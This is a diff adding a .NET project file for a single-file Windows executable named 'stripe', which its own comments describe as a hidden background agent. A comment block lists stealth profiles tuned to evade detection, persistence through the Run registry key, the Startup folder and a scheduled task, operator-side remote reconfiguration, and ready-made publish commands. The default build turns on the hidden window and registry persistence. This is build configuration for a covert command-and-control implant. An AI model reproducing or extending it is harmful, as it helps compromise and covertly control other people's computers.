@@ -1,0 +1,65 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <!-- WinExe prevents Windows from allocating a console window at process start.
+         This is the correct subsystem for a hidden background agent on Windows.
+         On Linux/macOS the distinction doesn't exist and it builds fine either way. -->
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net10.0</TargetFramework>
+    <AssemblyName>stripe</AssemblyName>
+    <LangVersion>latest</LangVersion>
+    <Nullable>enable</Nullable>
+    <ImplicitUsings>disable</ImplicitUsings>
+    <AllowUnsafeBlocks>false</AllowUnsafeBlocks>
+
+    <!-- Standalone single-file -->
+    <PublishSingleFile>true</PublishSingleFile>
+    <SelfContained>true</SelfContained>
+    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
+
+    <!-- Full trimming — safe now that there's no reflection-heavy SDK -->
+    <PublishTrimmed>true</PublishTrimmed>
+    <TrimMode>full</TrimMode>
+
+    <!-- Size / startup optimisations -->
+    <PublishReadyToRun>false</PublishReadyToRun>
+    <EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
+    <DebugType>none</DebugType>
+    <DebugSymbols>false</DebugSymbols>
+    <Optimize>true</Optimize>
+    <StripSymbols>true</StripSymbols>
+  </PropertyGroup>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════════════
+       COMPILE-TIME CONFIGURATION FLAGS
+       ═══════════════════════════════════════════════════════════════════════════════
+       
+       STEALTH PROFILES:
+         STEALTH_LOW        - Fast response, 2-5s poll, 15-30s heartbeat (DETECTED EASILY)
+         STEALTH_BALANCED   - Default, 5-15s poll, 25-35s heartbeat (MODERATE STEALTH)
+         STEALTH_HIGH       - Slow response, 30-60s poll, 120-180s heartbeat (HIGH STEALTH)
+         STEALTH_PARANOID   - Very slow, 120-300s poll, 600-900s heartbeat (MAXIMUM STEALTH)
+       
+       PERSISTENCE MECHANISMS:
+         PERSIST_REGISTRY   - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+         PERSIST_STARTUP    - Startup folder shortcut
+         PERSIST_TASK       - Scheduled task (daily at 9 AM)
+       
+       OPSEC FLAGS:
+         HIDE_CONSOLE       - No visible window on Windows
+         ALLOW_DYNAMIC_CONFIG - Enable operator-side runtime reconfiguration (recommended)
+       
+       EXAMPLE BUILD COMMANDS:
+         dotnet publish -c Release -p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
+         dotnet publish -c Release -p:DefineConstants="STEALTH_HIGH;HIDE_CONSOLE;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
+         dotnet publish -c Release -p:DefineConstants="STEALTH_PARANOID;PERSIST_REGISTRY;PERSIST_TASK;ALLOW_DYNAMIC_CONFIG"
+       ═══════════════════════════════════════════════════════════════════════════════ -->
+  
+  <PropertyGroup>
+    <!-- DEFAULT CONFIGURATION: Balanced stealth with dynamic control -->
+    <DefineConstants>HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG</DefineConstants>
+  </PropertyGroup>
+
+  <!-- Zero NuGet dependencies — HttpClient + System.Text.Json are in the runtime -->
+
+</Project>
